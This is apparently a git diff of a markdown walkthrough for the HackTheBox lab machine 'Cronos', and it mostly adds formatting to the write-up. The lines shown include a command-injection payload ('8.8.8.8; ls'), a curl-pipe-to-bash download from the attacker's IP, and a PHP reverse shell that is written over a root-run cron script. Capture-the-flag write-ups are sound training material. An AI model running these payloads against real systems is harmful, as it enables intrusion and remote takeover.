@@ -24,6 +24,7 @@ We have services running on port 22, 53 and 80. We'll check them in detail.
 First, lets check the website running on port 80. 
 
 ![](./images/cronos_apacheDefault.png)
+
 It just gives us a default Apache page. I tried gobuster on it but found no directories. :(
 
 <br/>
@@ -73,7 +74,7 @@ I verified if i could ping my machine, below we can see `tcpdump` capturing ping
 ![](./images/cronos_cmdexecution.png)
 
 Next, it was only natural to try to see if i could get <span id=green>command execution here</span>.<br/>
-So i tried the payload `8.8.8.8; ls` and it displayed the contents of web root directory. Great! We have command execution.
+So i tried the payload `8.8.8.8; ls` and it displayed the contents of web root directory.<br/>Great! We have command execution.
 
 Then i set up a listener on my local machine and ran a reverse shell on the server and got the session.<br/>
 
@@ -98,17 +99,19 @@ Next task: Priveldge escalation.
 
 Make a local python server and upload the `linEnum.sh` script.<br/>
 
-  Start a local python server  : `$ python -m SimpleHTTPServer 8181`
+  Start a local python server  : `$ python -m SimpleHTTPServer 8181`<br/>
   Download and run on attacker : `$ curl http://10.10.14.7/linEnum.sh | bash`
   
 ![](./images/cronos_linEnum1.png)
 
+<br/>
 Spent some times time looking at the output, its a lot. Then came across something <span id=green>interesting:</span>
 
 ![](./images/cronos_linEnum1.png)
 
 Above we can see, the PHP script `/var/www/laravel/artisan` is being run as root, which we can modify.
 
+<br/>
 Now, we prepare a PHP webshell and upload it to replace the contents of the  script `artisan`. 
 ```php
 #!/usr/bin/env php
@@ -119,12 +122,13 @@ $sock=fsockopen("10.10.14.7",4445);exec("/bin/sh -i <&3 >&3 2>&3");
 Below is detail of steps performed to upload PHP webshell
 ![](./images/cronos_exploitation.png)
 
-Meanwhile, we set up a listener at port `4445`, and waited for shell to execute via cronjob.
-After a minute, go the session :)
+<br/>
+Meanwhile, we set up a listener at port `4445`, and wait for shell to execute via cronjob.<br/>
+After a minute, go the session and can read the root flag :)
 
 ![](./images/cronos_root.png)
 
-Now, <span id=green>Cronos is Owned.</span>
+<span id=green>Cronos is Owned!!!</span>
 
 
 
